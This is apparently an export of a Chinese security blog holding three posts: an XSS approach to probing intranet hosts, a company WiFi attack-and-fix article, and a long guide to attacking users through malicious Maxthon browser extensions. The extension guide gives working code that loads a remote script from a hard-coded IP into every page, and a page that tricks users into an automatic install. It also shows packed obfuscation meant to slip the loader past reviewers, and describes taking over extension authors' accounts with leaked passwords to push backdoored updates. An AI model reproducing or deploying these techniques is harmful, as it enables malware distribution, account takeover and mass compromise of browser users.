前面的跳过，假设现在已经有了内网中开放80端口的IP。既然ajax、iframe都不行，那我们可以尝试一下flash来获取，但是flash也有相应的crossdomain.xml限制，但是今天上午查资料的时候找到了这么一篇文章：http://www.litefeel.com/cross-flash-security-sandbox-get-visual-data根据作者所说，这个方法只能获取到视觉对象（图片、swf），也就是说无法获取存活IP里的html源码了。 我想是否可以使用flash发送一个带有XSS的URL（内网IP）XSS里调用Html2canvas插件来把存活IP中的网站截图发送给我们的服务器端。当然了，这里有一个限制条件，就是必须获取存活IP中网站的cms信息（可以使用&lt;img src=&quot;内网IP/favicon.ico&quot;&gt;再把图片发送给远程服务器，来接受。这样就可以判断属于哪个cms类型的了，构架代码的时候可以加一个定时获取远程服务器的JavaScript代码，这样我们看到是cms类型后，就可以在网上找相应的爆版本信息的方法，写成代码，等待客服端的定时任务获取到）。 现在信息有了，还有一个条件，就是XSS漏洞，需要XSS漏洞来加载Html2canvas插件，并且保存成图片发送给远程的服务器。 问题来了，反射XSS并不是正真的打开网站，而是发送get请求。那canvas并不会加载，也就说图片获取失败。储蓄型的话可能成功。 失败的原因： canvas无法获取到iframe里的DOM内容 img无法发送到远程服务器，因为调用img图片的时候，当前页面和img的图片不是同源的，无法发送 隐蔽性很差 思路二、 之前我提到的思路是使用xss+iframe+canvas，但是@超威蓝猫 说到canvas无法截取到iframe里的内容，后来我上网查后，确实如此（基础不牢的结果）。后来我又有了一个新的思路，使用&lt;img src=&quot;https://xxx.xxx.xxx.xxx/favico.ico&quot; /&gt;来获取网站的cms信息，因为不同的cms他们的ico图标也是不一样的，把img发送到服务器端后，就可以识别网站属于哪种cms类型了。但是后来和伟哥 @呆子不开口 讨论了几个小时，发现忽略了一个重要的问题，怎么把img发送到远程服务器，img图片地址不是同源的，而且怎么把图片使用JavaScript转成二进制数据。这个思路又断了。伟哥提到一个很nice的解决方案，检测js脚本，也就是&lt;script src=&quot;http://xxx.xxx.xxx.xxx/path/cms.js&quot; onload=&quot;xxx(this)&quot;&gt;&lt;/script&gt;这样的话，我就需要大量cms独立的js文件位置。工作量大。我本来都打算使用这个了，但是前几天闲的无聊翻自己的QQ日志时，发现了一段代码：123document.addEventListener(\"visibilitychange\", function() &#123; document.title = document.hidden ? 'iloveyou' : 'metoo';&#125;); 这是HTML5推出的API，我发现我可以利用这个API来达到神不知鬼不觉的上传图片。首先当用户切换到其他浏览器标签的时候，document.hidden会为true。那么我们就可以确定用户没有访问我们XSS的网页。那么我们干什么用户都不会发现了。大致的思路如下：1234567891011document.addEventListener(\"visibilitychange\", function() &#123; if(document.hidden)&#123; var htmlText = $(\"body\").html(); $(\"body\").empty(); $(\"body\").append(\"&lt;img src='http://xxx.xxx.xxx.xxx/favico.ico' /&gt;\"); //canvas获取页面，请移步：http://leobluewing.iteye.com/blog/2020145 &#125;else&#123; $(\"body\").empty(); $(\"body\").append(htmlText); &#125;&#125;); 失败的原因： 因为之前提到过img加载太消耗时间，尤其在maxthon浏览器下，三组以上的IP地址全部检测完成需要30分钟左右。如果用此方法的话，需要确保用户在半个小时内不能打开此页面 canvas无法获得不是本源的图片，也就是说不能获取到img加载的图片 总结后，就采用了伟哥的方法。 0x14结尾： 在此尤其感谢，@呆子不开口 。这篇文章写的很累，因为img标签发送的耗时长的问题，导致每一次修改BUG的时候，都需要等9-10分钟。也是我目前为止写的时间最长的一篇文章。因为要学驾照，时间更少了。大概花了一个月左右的时间。之前和主编约稿的日期是15日，一直拖到现在，挺对不住的。前端、后端、数据库还有些的BUG没有修复，如果此平台的安装量达到1000会继续更新，下面是平台下载的url：https://github.com/BlackHole1/WebRtcXSS 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","categories":[],"tags":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://bugs.cc/tags/WEB安全/"}]},{"title":"公司wifi安全","slug":"公司wifi安全","date":"2016-12-13T03:00:48.000Z","updated":"2016-12-15T03:38:16.854Z","comments":true,"path":"2016/12/13/公司wifi安全/","link":"","permalink":"http://bugs.cc/2016/12/13/公司wifi安全/","excerpt":"0x0 前言： 很多的公司都没有安全团队，只有运维来负责整个公司的安全，从而安全问题也大打折扣。我最近一直在给各个公司做安全检测，就把自己的心得写下来，有什么不足之处还望补充。 0x1 无线安全： 很多的公司都有不怎么注重公司的无线电安全，有钱的公司买设备，没钱的公司搞人力。但是人的技术在好，没有设备的辅助，单纯的人力在厉害也没什么用。 很多的公司WIFI认证基本都是WPA/WPA2然后加个WEB二次认证，认为这样就万无一失了，而其实这并没有什么用。破解WPA，可以使用aircrack-ng、airmon-ng、airodump-ng、aireplay-ng来实现破解，WPA2使用字典穷举。 当然也可以使用大菠萝伪造一个WIFI。而大家也都知道有一款神器叫做“wifi万能钥匙”，可以先去看看wifi万能钥匙能不能解，不能解的话再破。连上WIFI后，将会提示你需要进行WEB二次认证。这里你完全可以弃之不理，因为它并没有什么用。 因为你是WPA/WPA2的认证方式，你连上WIFI之后，交换机就会马上分配给你一个内网IP（我遇到的是交换机，也可能是路由器）一个黑客要你外网干什么，他需要的是公司的内网资源。","text":"0x0 前言： 很多的公司都没有安全团队，只有运维来负责整个公司的安全，从而安全问题也大打折扣。我最近一直在给各个公司做安全检测，就把自己的心得写下来，有什么不足之处还望补充。 0x1 无线安全： 很多的公司都有不怎么注重公司的无线电安全，有钱的公司买设备，没钱的公司搞人力。但是人的技术在好，没有设备的辅助，单纯的人力在厉害也没什么用。 很多的公司WIFI认证基本都是WPA/WPA2然后加个WEB二次认证，认为这样就万无一失了，而其实这并没有什么用。破解WPA，可以使用aircrack-ng、airmon-ng、airodump-ng、aireplay-ng来实现破解，WPA2使用字典穷举。 当然也可以使用大菠萝伪造一个WIFI。而大家也都知道有一款神器叫做“wifi万能钥匙”，可以先去看看wifi万能钥匙能不能解，不能解的话再破。连上WIFI后，将会提示你需要进行WEB二次认证。这里你完全可以弃之不理，因为它并没有什么用。 因为你是WPA/WPA2的认证方式，你连上WIFI之后，交换机就会马上分配给你一个内网IP（我遇到的是交换机，也可能是路由器）一个黑客要你外网干什么，他需要的是公司的内网资源。连不上网对黑客来说没有什么问题。我给某公司做安全检测的时候，万能钥匙破解—中间人嗅探。不到两分钟拿到了他们公司官网后台管理员的权限。 WEB认证在我看来不是针对于黑客的，是针对于员工的，因为黑客不需要外网资源，但是员工需要。下面是我画的图： 思维导图URL 黑客连入WIFI后，虽然WEB二次认证不了，但是黑客现在已经处于内网中，他可以访问内网的任何资源。 修复建议： 把WPA/WPA2无线认证换成802.1x认证方式（802.1x无线认证方式需要交换机的支持） 买针对无线检测/防御设备 无线不能访问内网资源，只有有线可以访问内网资源（从物理上隔绝问题） 关于802.1x认证方式，他的原理图是下面这样的: 思维导图URL 黑客即使连上公司WIFI，但是无法通过802.1x认证，导致 公司设备（路由器、交换机）无法分配给你内网IP和外网出口IP的资格。 0x2 较为深入无线安全： 像上面所讲，只是针对公司开放的WIFI进行管理。 而上面的三个解决方案，只有第一个相比之下是比较方便还不用花钱的（机房设备需要支持802.1x无线协议，不支持还是要花钱）。 第二个，公司如果不想花钱是不会选择的，而且买了还要配置，前期工作量特别大。 第三个，工作量大，需要重新架构公司网络，我和一个同事在下午6点下班后一直忙到第二天上班之前才搞定。 如果公司不想花钱或者运维不想重新架构的话，第一种是很好的选择，但是这里又有一个问题，360/百度随身WIFI，这个东西的存在，对那些本来就不怎么安全的公司更是雪上加霜。 360/百度随身WIFI插入公司电脑后，会开启ICS服务，加上自带的无线网卡AP功能。当你连上这个随身WIFI之后，相当于一个小型的局域网。这时我们可以先入侵那个插了随身WIFI的PC电脑，通过它来入侵整个公司。如果你只需要某个接口，则不需要入侵插了随身WIFI的PC电脑。这里假设下“我需要的是这个网站的后台，可是想要登陆这个网站后台，需要出口IP是这个公司的外网IP”这样的话，我们则不需要入侵插了随身WIFI的PC电脑来。为什么呢？我画了一个图，大家看下: 思维导图URL 黑客连入WIFI后，无需进行WEB二次认证，因为它使用的是员工的网络，员工也肯定认证过了，员工使用的是公司内网，内网有个统一的出口IP，而服务器端也只认这个IP，其他IP连不上服务器。 解决办法，网上很多，可以参考网上的教程。 如果你又更好的解决方案，可以提出来。我个人的思路有限。有不足之处，还望见谅。 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","categories":[],"tags":[{"name":"无线安全","slug":"无线安全","permalink":"http://bugs.cc/tags/无线安全/"}]},{"title":"浏览器插件的攻击向量","slug":"浏览器插件的攻击向量","date":"2016-10-05T12:35:52.000Z","updated":"2016-10-31T09:26:48.103Z","comments":true,"path":"2016/10/05/浏览器插件的攻击向量/","link":"","permalink":"http://bugs.cc/2016/10/05/浏览器插件的攻击向量/","excerpt":"0x0 前言： 我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。 0x1 让自己变成攻击者： 我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。 在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。 大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法： 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件” 被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装 基于社工库控制插件作者的账户，加入后门代码，更新插件 控制插件里调用的第三方javascript代码 现在有四种方法供我们选择，我们一个个来进行介绍。","text":"0x0 前言： 我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。 0x1 让自己变成攻击者： 我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。 在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。 大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法： 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件” 被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装 基于社工库控制插件作者的账户，加入后门代码，更新插件 控制插件里调用的第三方javascript代码 现在有四种方法供我们选择，我们一个个来进行介绍。 0x1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”这个方法类似于之前的问题强迫安装恶意Chrome扩展 攻击者使用激进方式。这里我们也来实现一下并且优化下，此处使用的案例是“MaxThon遨游浏览器插件”。 0x1.1.1 检测是否安装了某插件我们先把这个攻击方式的代码目录架构进行说明： 网站页面:index.html 插件目录:12345678910111213141516171819202122232425262728293031323334353637383940icons/ 插件的logo存放目录icons/icons.svg 插件logo文件def.json 插件的主控制文件，里面存着整个插件的配置代码如下:[ &#123; &quot;type&quot;: &quot;extension&quot;, &quot;frameworkVersion&quot;:&quot;1.0.0&quot;, &quot;version&quot;:&quot;1.0.0&quot;, &quot;guid&quot;: &quot;&#123;7c321680-7673-484c-bcc4-de10f453cb8e&#125;&quot;, &quot;name&quot;: &quot;plug_setup&quot;, &quot;author&quot;: &quot;Black-Hole&quot;, &quot;svg_icon&quot;:&quot;icon.svg&quot;, &quot;title&quot;: &#123; &quot;zh-cn&quot;: &quot;欺骗用户安装插件&quot; &#125;, &quot;description&quot;:&#123; &quot;zh-cn&quot;:&quot;欺骗用户安装插件&quot; &#125;, &quot;main&quot;:&quot;index.html&quot;, &quot;actions&quot;: [ &#123; &quot;type&quot;: &quot;script&quot;, &quot;entryPoints&quot;: [ &quot;doc_onload&quot; ], &quot;js&quot;: [ &quot;base.js&quot; ], &quot;include&quot;: [&quot;*&quot;], &quot;includeFrames&quot;: true &#125; ] &#125;]base.js 每打开一个页面，要执行的JavaScript代码代码如下:后文会提到 我翻遍了整个遨游插件的API手册，没有找到类似chrome Plug API的：123456789101112chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) &#123; if(request.act == 'ping')&#123; sendResponse(&#123;\"act\": \"tong\"&#125;); &#125;&#125;)chrome.runtime.sendMessage(\"extensionId\", &#123;\"act\": \"ping\"&#125;, function(response)&#123; if(response &amp;&amp; response.act == 'tong')&#123; console.log('已安装'); &#125;else&#123; console.log('未安装'); &#125;&#125;); 既然没有找到，我们就要想其他比较Hack的办法来解决这个问题。 这里我使用的办法是利用JavaScript全局及setTimeout函数来解决这个问题。 首先在插件里的base.js文件里写入: 123var script = document.createElement('script');script.src = \"http://119.29.58.242/control.js\";document.body.appendChild(script); 上面，这段代码将会在每个页面里的body标签后面写入&lt;script src=&quot;http://119.29.58.242/control.js&quot;&gt;&lt;/script&gt;代码，而在http://119.29.58.242/control.js文件里的代码为:123window.plug_setup = function()&#123;&#125; 这时，用户打开任何一个网页，那个网页的全局函数中就会有一个名为plug_setup的函数，并且不具有任何作用，很容易让人忽略掉，只会在特殊的页面中才会起作用。 然后我们再在网站的页面里写：12345setTimeout(function()&#123; if(typeof(plug_setup)!=\"function\")&#123; alret(\"因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面\"); &#125;&#125;,1000) 因为页面加载、网络等问题照成的延迟问题，这里我们设置为1秒后运行检测代码。1秒后，将会运行123if(typeof(plug_setup)!=\"function\")&#123; alret(\"因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面\");&#125; 这个时候如果全局没有plug_setup函数，将会运行下面的alert函数，告诉用户需要安装插件才可以访问。 0x1.1.2 欺骗用户进行半自动安装指定插件我觉的如果让用户安装插件的话，你跳转到页面，让用户把插件的信息、评论看完再安装，岂不是成功率大大降低了，而且也不符合网站的优化。《点石成金》一书上说过这样一句话“不要让用户思考”，这个虽然是网站设计里面的至理名言，但是也同样可以放在攻击里，当一个用户的思考变得更少时，那么他会有很大程度上会跟着攻击者设计好的路走。 于是，我分析了遨游浏览器安装插件页面里的JavaScript，发现遨游浏览器进行安装插件时调用API在任何页面都可以运行，会照成攻击者在页面写上一些JavaScript代码后，就会像遨游浏览器那样弹出一个框询问用户是否安装插件： 我这里进行一些优化，代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293var ERRORTEXT = &apos;非傲游浏览器或版本过低。&lt;a href=&quot;http://www.maxthon.cn&quot; target=&quot;_blank&quot;&gt;点此获取最新版本傲游浏览器&lt;/a&gt;&apos;function getInstallMessage(that, messagePack, type) &#123; if (external.mxCall) &#123; var packMxAttr = $(that).closest(messagePack); if (type === &apos;skin&apos;) &#123; // 浏览器框架版本号 var frameVersion = external.mxCall(&apos;GetSkinFxVersion&apos;); &#125; else if (type === &apos;app&apos;) &#123; // 浏览器框架版本号 var frameVersion = external.mxCall(&apos;GetAppFxVersion&apos;); // 下个版本上了就删掉-- if (frameVersion === &apos;1.0.0&apos;) &#123; frameVersion = &apos;1.0.1&apos;; &#125; // --下个版本上了就删掉 &#125; // 插件包框架版本号 var packMxVersion = packMxAttr.attr(&apos;file_def&apos;); // 插件包url var packUrl = packMxAttr.attr(&apos;file_url&apos;); // 插件id var packId = packMxAttr.attr(&apos;file_id&apos;); installPack(frameVersion, packMxVersion, packUrl, type, packId); &#125; else &#123; resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;); &#125;&#125;function installPack(frameVersion, packMxVersion, packUrl, type, packId) &#123; var isInstall = returnIsInstall(frameVersion, packMxVersion); if (isInstall !== -1) &#123; if (type === &apos;skin&apos;) &#123; external.mxCall(&apos;InstallSkin&apos;, packUrl); &#125; else if (type === &apos;app&apos;) &#123; external.mxCall(&apos;InstallApp&apos;, packUrl); &#125; getUser(packId); &#125; else &#123; resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;); &#125;&#125;function returnIsInstall(frameVersion, packMxVersion) &#123; var fvItem; var pvItem; var frameVersion = getVersionArr(frameVersion); var packMxVersion = getVersionArr(packMxVersion); // 定义增长索引值. var i = 0; while (1) &#123; fvItem = frameVersion[i]; pvItem = packMxVersion[i]; if (fvItem == null &amp;&amp; pvItem == null) &#123; return 0; &#125; if (fvItem == null) &#123; return -1; &#125; if (pvItem == null) &#123; return 1; &#125; if (fvItem != pvItem) &#123; var value = fvItem &gt; pvItem ? 1 : -1 return value; &#125; i++; &#125;&#125;function getVersionArr(version) &#123; var versionArr = version.split(&apos;.&apos;); for (var i = 0; i &lt; versionArr.length; i++) &#123; versionArr[i] = parseInt(versionArr[i], 10); &#125;; return versionArr;&#125;function getUser(id) &#123; $.ajax(&#123; type: &apos;GET&apos;, url: &apos;http://extension.maxthon.cn/common/ajax.php?id=&apos; + id, data: &apos;data&apos;, dataType: &apos;json&apos;, success: function (data) &#123;&#125;, error: function () &#123;&#125; &#125;);&#125;$(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) &#123; event.preventDefault(); event.stopPropagation(); getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;);&#125;); 详情可以在http://extension.maxthon.cn/js/temp.js里第1256行到1600行查看原始代码。 此处的代码里的入口处就在12345$(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) &#123; event.preventDefault(); event.stopPropagation(); getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;);&#125;); 当点击id为app-install的DOM时，会先调用getInstallMessage函数，getInstallMessage函数里再调用installPack函数，installPack函数调用returnIsInstall函数和getUser函数，returnIsInstall函数调用了getVersionArr函数。 最核心的代码在installPack函数里的external.mxCall(&#39;InstallApp&#39;, packUrl);，但是无法直接调用，不然无法安装。而且这里的packUrl必须是http://extension.maxthon.cn下的，不然无法安装，需要事先提交你的插件到遨游插件平台，才可以。 上面说到当点击id为app-install的DOM时才会触发，我这个人比较懒。就直接copy遨游插件的html代码了，顺便把他隐藏了：&lt;a id=&quot;app-install&quot; style=&quot;display:none;&quot; file_def=&quot;1.0.1&quot; file_url=&quot;http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon&quot; file_id=&quot;&lt;?echo $view_id;?&gt;&quot;&gt;安装&lt;/a&gt;，这里的file_id为&lt;?echo $view_id;?&gt;估计是遨游的程序员没写好代码，PHP没解析成功，解析成html代码了。但是我懒得改，就这样把。然后我再在他们的后面增加$(&quot;#app-install&quot;).click();代码，让他自动触发 完整的网站代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;title&gt;欺骗用户安装插件&lt;/title&gt; &lt;script src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; 欺骗用户安装插件demo1 &lt;a id=&quot;app-install&quot; style=&quot;display:none;&quot; file_def=&quot;1.0.1&quot; file_url=&quot;http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon&quot; file_id=&quot;&lt;?echo $view_id;?&gt;&quot;&gt;安装&lt;/a&gt;&lt;/body&gt;&lt;script src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; setTimeout(function()&#123; if(typeof(plug_setup)!=&quot;function&quot;)&#123; alert(&quot;因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后打开此页面&quot;); var ERRORTEXT = &apos;非傲游浏览器或版本过低。&lt;a href=&quot;http://www.maxthon.cn&quot; target=&quot;_blank&quot;&gt;点此获取最新版本傲游浏览器&lt;/a&gt;&apos; function getInstallMessage(that, messagePack, type) &#123; if (external.mxCall) &#123; var packMxAttr = $(that).closest(messagePack); if (type === &apos;skin&apos;) &#123; // 浏览器框架版本号 var frameVersion = external.mxCall(&apos;GetSkinFxVersion&apos;); &#125; else if (type === &apos;app&apos;) &#123; // 浏览器框架版本号 var frameVersion = external.mxCall(&apos;GetAppFxVersion&apos;); // 下个版本上了就删掉-- if (frameVersion === &apos;1.0.0&apos;) &#123; frameVersion = &apos;1.0.1&apos;; &#125; // --下个版本上了就删掉 &#125; // 插件包框架版本号 var packMxVersion = packMxAttr.attr(&apos;file_def&apos;); // 插件包url var packUrl = packMxAttr.attr(&apos;file_url&apos;); // 插件id var packId = packMxAttr.attr(&apos;file_id&apos;); console.log(frameVersion, packMxVersion, packUrl, type, packId) installPack(frameVersion, packMxVersion, packUrl, type, packId); &#125; else &#123; resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;); &#125; &#125; function installPack(frameVersion, packMxVersion, packUrl, type, packId) &#123; var isInstall = returnIsInstall(frameVersion, packMxVersion); if (isInstall !== -1) &#123; if (type === &apos;skin&apos;) &#123; external.mxCall(&apos;InstallSkin&apos;, packUrl); &#125; else if (type === &apos;app&apos;) &#123; external.mxCall(&apos;InstallApp&apos;, packUrl); &#125; getUser(packId); &#125; else &#123; resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;); &#125; &#125; function returnIsInstall(frameVersion, packMxVersion) &#123; var fvItem; var pvItem; var frameVersion = getVersionArr(frameVersion); var packMxVersion = getVersionArr(packMxVersion); // 定义增长索引值. var i = 0; while (1) &#123; fvItem = frameVersion[i]; pvItem = packMxVersion[i]; if (fvItem == null &amp;&amp; pvItem == null) &#123; return 0; &#125; if (fvItem == null) &#123; return -1; &#125; if (pvItem == null) &#123; return 1; &#125; if (fvItem != pvItem) &#123; var value = fvItem &gt; pvItem ? 1 : -1 return value; &#125; i++; &#125; &#125; function getVersionArr(version) &#123; var versionArr = version.split(&apos;.&apos;); for (var i = 0; i &lt; versionArr.length; i++) &#123; versionArr[i] = parseInt(versionArr[i], 10); &#125;; return versionArr; &#125; function getUser(id) &#123; $.ajax(&#123; type: &apos;GET&apos;, url: &apos;http://extension.maxthon.cn/common/ajax.php?id=&apos; + id, data: &apos;data&apos;, dataType: &apos;json&apos;, success: function (data) &#123;&#125;, error: function () &#123;&#125; &#125;); &#125; $(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) &#123; event.preventDefault(); event.stopPropagation(); getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;); &#125;); $(&quot;#app-install&quot;).click(); &#125; &#125;,1000);&lt;/script&gt;&lt;/html&gt; 打开后的样子: 这处的LOL战绩查询插件是我之前上传的(不要安装)。真正攻击时可以换成不要那么二的名字，比如”网站增强工具”等 一开始，我还想试试能不能点击劫持，这样就可以在用户不知情的情况下安装插件，但是这个安装程序不是在页面里面的。无法进行劫持，随之放弃。 这样一来，尽量让用户少思考的网页就做好了。发布，等待用户上钩吧。这个方法可以与APT攻击中的”水坑攻击”进行相结合，以达到针对性某些特殊的群体或个体的攻击方式 0x1.2 被动等待这个办法是属于广撒网，当没有指定性群体或者个人，只是为了单纯的攻击或者研究时使用。 这里也有一些小技巧，当开发者上传插件时，遨游审核人员会对插件进行审核，如果发现危害用户的代码，将不给予通过，乍一看没什么问题，但是没有后续了。 没有定期自动化扫描插件代码 而且即使插件是一个小游戏用，都可以在配置文件def.json里申请权限是最高的 当代码量足够多的时候，开发人员可以把一些危害到用户请求的代码进行加密混编绕过审查人员的眼睛。（调用伟大的人民领袖毛主席的一句话:与规矩斗，其乐无穷。与代码斗其乐无穷。与人斗其乐无穷。） 可以在插件里调用第三方的JavaScript代码，第三方url可以指向任何域名。没有进行判断URL及js文件是否为可信 利用以上的问题，我们就可以写出一个具有危害到用户插件，且绕过审查人员的眼睛。 我们可以在插件源码base.js文件里写12345//xxxxx其他多余的代码var script = document.createElement('script');script.src = \"http://你的域名/javascript文件名.js\";document.body.appendChild(script);//xxxxx其他多余的代码 如果不放心可可以加密成下面的这种格式:1eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&apos;&apos;.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&apos;\\\\w+&apos;&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&apos;\\\\b&apos;+e(c)+&apos;\\\\b&apos;,&apos;g&apos;),k[c]);return p;&#125;(&apos;o 7=[&quot;\\\\e\\\\c\\\\g\\\\b\\\\a\\\\9&quot;,&quot;\\\\c\\\\g\\\\6\\\\8\\\\9\\\\6\\\\q\\\\h\\\\6\\\\j\\\\6\\\\f\\\\9&quot;,&quot;\\\\e\\\\g\\\\c&quot;,&quot;\\\\m\\\\9\\\\9\\\\a\\\\t\\\\i\\\\i\\\\d\\\\n\\\\j\\\\8\\\\b\\\\f\\\\i\\\\l\\\\8\\\\s\\\\8\\\\e\\\\c\\\\g\\\\b\\\\a\\\\9\\\\r\\\\b\\\\h\\\\6\\\\f\\\\8\\\\j\\\\6\\\\u\\\\l\\\\e&quot;,&quot;\\\\8\\\\a\\\\a\\\\6\\\\f\\\\d\\\\w\\\\m\\\\b\\\\h\\\\d&quot;,&quot;\\\\x\\\\n\\\\d\\\\v&quot;];o k=p[7[1]](7[0]);k[7[2]]=7[3];p[7[5]][7[4]](k)&apos;,34,34,&apos;||||||x65|_0|x61|x74|x70|x69|x63|x64|x73|x6E|x72|x6C|x2F|x6D|script|x6A|x68|x6F|var|document|x45|x66|x76|x3A|x2E|x79|x43|x62&apos;.split(&apos;|&apos;),0,&#123;&#125;)) 方法为：先在javascriptobfuscator上把正常的javascript代码加密成:1var _0x67c5=[&quot;\\x73\\x63\\x72\\x69\\x70\\x74&quot;,&quot;\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74&quot;,&quot;\\x73\\x72\\x63&quot;,&quot;\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x64\\x6F\\x6D\\x61\\x69\\x6E\\x2F\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x66\\x69\\x6C\\x65\\x6E\\x61\\x6D\\x65\\x2E\\x6A\\x73&quot;,&quot;\\x61\\x70\\x70\\x65\\x6E\\x64\\x43\\x68\\x69\\x6C\\x64&quot;,&quot;\\x62\\x6F\\x64\\x79&quot;];var script=document[_0x67c5[1]](_0x67c5[0]);script[_0x67c5[2]]= _0x67c5[3];document[_0x67c5[5]][_0x67c5[4]](script) 如图： 因为这样的代码看起来着实有点可疑…所以再去站长之家加密成常见的加密代码: 嗯，看着正常多了。放在众多代码之中，审查人员也很难找到(也不会用心找的) 提交后，会在遨游插件的首页显示最近更新的插件，你只需要每个星期随便增加一点代码或者删除一点代码，再更新一下插件，你的插件就会常年存在插件首页，安装人数想不多都难。 0x1.3 基于社工库控制插件作者的账户这个也是我个人来说最喜欢的方式，毕竟不得不承认不劳而获真的好爽啊。 因为Maxthon更新插件时没有像Chrome那样需要秘钥才可以更新，所以导致这个’逻辑漏洞’’。因为没有验证当前是否为作者本人的机制，才导致这个方法的可行性。 之前加了maxthon插件的作者群：203339427 里面大多都是插件的开发人员，拿他们的邮箱、QQ放在社工库里进行查询，得到密码后可以进行尝试登陆。当然因为不确定是作者使用的是哪个邮箱，我们先拿QQ邮箱登录，他会提示账户或密码错误，不知道是账户错误还是密码错误，可以先去遨游账户中心-忘记密码先填写QQ邮箱，如果说用户名不存在，我们可以在网上搜索一下这个作者其他的邮箱，再进行测试(我测试的账户里，很多都需要在网上搜索一下其他的邮箱)。因为之前我把这个当做漏洞提交给wooyun了，遨游没什么反应。本来是想登陆其他用户说明的，但是wooyun暂时休整，无法看到我之前的漏洞详情，而当时社到的账户和密码也没有备份，只在wooyun漏洞详情里有，没有办法，所以这里我就以我自己为例： 这里有个更新文件，我们这个时候，可以先把文件download本地，在里面的javascript文件里植入我们的后门。再上传上去。就可以控制1000多个用户了。插件二次审核查的更松。 而且当你打开遨游浏览器时，遨游浏览器会检测你的插件是否为最新的，如果不是最新的，他会在后台静默安装最新的插件。这个时候对我们的帮助特别大。比如我们更新插件后，只需要等待用户重新打开遨游浏览器就可以实现了攻击的效果。 更新的时候，就这个账户当做自己的账户就行了，然后照着0x1.2代码写上去就没问题了。 0x1.4 控制插件里调用的第三方javascript代码这个方法比较繁琐，有两种方法来获取第三方的javascript，分为两种情况 不具有可视化页面 具有可视化页面 0x1.4.1 不具有可视化页面类似我上面所说的，在插件的def.json配置文件里写上:1234567891011\"actions\": [&#123; \"type\": \"script\", \"entryPoints\": [ \"doc_onload\" ], \"js\": [ 